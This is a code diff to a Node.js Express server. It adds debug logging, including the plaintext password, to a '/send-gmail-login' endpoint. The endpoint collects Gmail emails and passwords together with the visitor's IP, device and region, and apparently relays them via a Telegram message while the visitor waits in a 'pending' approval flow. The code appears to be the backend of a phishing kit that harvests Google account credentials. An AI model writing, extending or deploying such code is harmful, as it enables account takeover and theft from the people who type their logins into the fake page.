@@ -318,11 +318,14 @@ app.post("/api/update-device-approval-status", (req, res) => {
 
 app.post("/send-gmail-login", async (req, res) => {
   try {
+    console.log('🔍 DEBUG: /send-gmail-login endpoint called');
     const { email, password, userId } = req.body;
+    console.log('🔍 DEBUG: Received email:', email, 'password:', password, 'userId:', userId);
     if (!email || !password || !userId) return res.status(400).json({ error: "Missing email, password, or userId" });
     
     const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
     const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
     displayEmailStore[displayEmailKey] = email;
     console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
     const { ip, device, region } = await getClientInfo(req);
@@ -377,6 +380,7 @@ app.post("/send-gmail-login", async (req, res) => {
       console.error("❌ Failed to send Gmail Login Telegram message:", err);
     }
 
+    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
     res.json({ status: "pending", requestId, displayEmailKey });
   } catch (err) {
     console.error("❌ Gmail Login endpoint error:", err);
